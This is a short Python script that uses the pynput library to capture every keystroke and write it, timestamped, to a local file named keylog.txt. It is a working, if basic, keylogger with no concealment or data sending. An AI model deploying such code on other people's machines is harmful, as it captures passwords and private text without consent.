from pynput import keyboard
import logging

# Setup logging to a file
log_directory = "keylogs/"
log_file = log_directory + "keylog.txt"

# Make sure the directory exists
import os
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Configure logging format
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define what to do when a key is pressed
def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key Pressed: {key}")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()